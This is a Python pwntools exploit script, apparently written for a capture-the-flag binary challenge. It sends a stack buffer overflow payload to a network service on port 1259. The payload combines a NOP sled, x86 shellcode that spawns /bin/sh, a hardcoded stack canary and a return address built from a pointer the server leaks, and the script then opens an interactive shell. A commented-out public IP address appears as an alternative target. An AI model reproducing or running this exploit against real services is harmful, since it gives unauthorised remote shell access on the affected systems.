#!/usr/bin/env python
import re
import struct
import sys
from pwn import *

BUFFER_SIZE = 128
STACK_SPACE = "\x90"*12
BYTES_TO_PASS_RPTR = 152
BYTES_TO_COOKIE = 128

#SHELL_CODE_EXIT = "\xb0\x01\x31\xdb\xcd\x80"
#SHELL_CODE_HELLO = "\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x05\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x68\x65\x6c\x6c\x6f"

SHELL_CODE = "\x31\xC0\xB0\x46\x31\xDB\x31\xC9\xCD\x80\xEB"+\
"\x1E\x5B\x31\xC0\x88\x43\x07\x89\x5B\x08" + \
"\x83\xC3\x04" + \
"\x89\x43\x08" + \
"\x83\xEB\x04" + \
"\xB0\x0E" +\
"\x48\x48\x48" +\
"\x8D\x4B\x08" + \
"\x83\xC3\x04" + \
"\x8D\x53\x08" + \
"\x83\xEB\x04" + \
"\xCD\x80" +\
"\xE8\xDD\xFF\xFF\xFF"+\
"\x2F\x62\x69\x6E\x2F\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42"

SLED = "\x90"*12
REMAINING_BUFF = "\x90"*(BUFFER_SIZE-len(SHELL_CODE)-len(SLED))

def makeShellWord(number):
	return struct.pack('<I',number)

CANARY = makeShellWord(0x475a31a5)+makeShellWord(0x40501555)

def makePayloadString(offset):
	offset = int(offset,16)
	shell_ptr = makeShellWord(offset)

	payload_str = SLED + SHELL_CODE + REMAINING_BUFF + \
		CANARY + STACK_SPACE + shell_ptr
	
	return payload_str

if __name__ == "__main__":
	#server_address = '54.173.98.115
	#port = 1259
	server_address = 'localhost'
	port = 1259

	sock = remote(server_address, port, timeout=None)
	data = sock.recv(16)
	print data[6::]
	
	payload = makePayloadString(data[6::])
	sock.sendline(payload)
	sock.interactive()